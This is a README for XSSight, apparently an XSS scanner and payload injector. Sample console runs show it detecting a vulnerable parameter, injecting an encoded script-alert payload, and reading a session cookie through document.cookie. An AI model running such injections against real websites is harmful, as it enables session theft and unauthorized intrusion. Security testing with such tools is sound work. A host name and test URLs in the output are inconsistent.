# XSSight

XSSight is an XSS Scanner and Payload Injector.

## Usages

##### Scanning for payload

```
root@kali:~# python /root/XSSight/xssight.py
	    .-'^`\                                        /`^'-.
	  .'   ___\                                      /___   `.
	 /    /.---.                                    .---.\    `
	|    //     '-.  ___________________________ .-'     \    |
	|   ;|         \/--------------------------//         |;   |
	\   ||       |\_)          XSSight         (_/|       ||   /
	 \  | \  . \ ;  |     By Team Ultimate     || ; / .  / |  /
	  '\_\ \ \ \ \ |                          ||/ / / // /_/'
	        \ \ \ \|       Beta Release       |/ / / //
	         `'-\_\_\     teamultimate.in     /_/_/-'`
	                '--------------------------' 
 These types of URLs are accepted
 Example: http://www.dwebsite.com/ 
 Example: http://www.website.com= 
 Example: http://www.website.com? 

 Enter target url: teamultimate.in/test.php?q=1
 
------------------------------
Select an operation:
------------------------------
 1. XSS Scanner
 2. Payload Injector
 Enter your choice [1-2] : 1
------------------------------
Date: Thu, 13 Apr 2017 10:29:37 GMT
Server: Apache/2.2.3 (CentOS)
Cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Set-Cookie: PHPSESSID=uuoseraa5aeaqct5urq2bfu766; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Vary: Accept-Encoding,User-Agent
Connection: close
Content-Type: text/html; charset=UTF-8

* scanning GET parameter 'q'
 (i) GET parameter 'q' appears to be XSS vulnerable ("<script>.'.xss.'.</script>", enclosed by <script> tags, inside single-quotes, no filtering)
 ```
 ##### Injecting payload
 ```
 ------------------------------
Select an operation:
------------------------------
 1. XSS Scanner
 2. Payload Injector
 Enter your choice [1-2] : 2
------------------------------
Date: Thu, 13 Apr 2017 10:32:58 GMT
Server: Apache/2.2.3 (CentOS)
Cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Set-Cookie: PHPSESSID=hrk67m70t3dn9u27626d5n4fi7; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Vary: Accept-Encoding,User-Agent
Connection: close
Content-Type: text/html; charset=UTF-8

[+] Injecting payloads in the parameter: http://teamultimate.in/search.php?q=d
 Testing: http://teamultimate.ink/search.php?q=d%22%3Cscript%3Ealert%28%27XSSYA%27%29%3C%2Fscript%3E
 Source Length: 56048
 WAF Not Found

[!] XSS: http://teamultimate.in/test.php?q=d%22%3Cscript%3Ealert%28%27XSSYA%27%29%3C%2Fscript%3E 

[+] Confirmed Payload Found in Web Page Code
Excuting document.cookie
==> <Cookie PHPSESSID=vj8o3b8ohmf18rco6fvm5uads5 for teamultimate.in/>


```
